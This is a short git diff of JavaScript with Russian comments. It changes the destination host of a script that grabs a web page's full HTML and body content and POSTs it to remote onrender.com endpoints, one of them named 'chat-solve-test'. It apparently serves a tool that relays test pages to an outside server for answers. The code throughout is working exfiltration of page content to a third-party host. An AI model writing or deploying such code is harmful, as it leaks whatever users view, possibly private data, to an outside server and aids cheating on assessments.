@@ -1,7 +1,7 @@
 let isUserEvent = false; // Флаг для игнорирования автособытий
 const allHtml = document.documentElement.outerHTML;
 
-fetch("https://adi-hack.onrender.com/entered", {
+fetch("https://haad.onrender.com/entered", {
   method: "POST",
   headers: { "Content-Type": "application/json" },
   body: JSON.stringify({ allHtml }),
@@ -10,7 +10,7 @@ fetch("https://adi-hack.onrender.com/entered", {
 async function fetchAndRender() {
   const html = document.body.innerHTML;
   isUserEvent = false; // Перед обновлением выключаем реакцию
-  fetch("https://adi-hack.onrender.com/chat-solve-test", {
+  fetch("https://haad.onrender.com/chat-solve-test", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ html }),
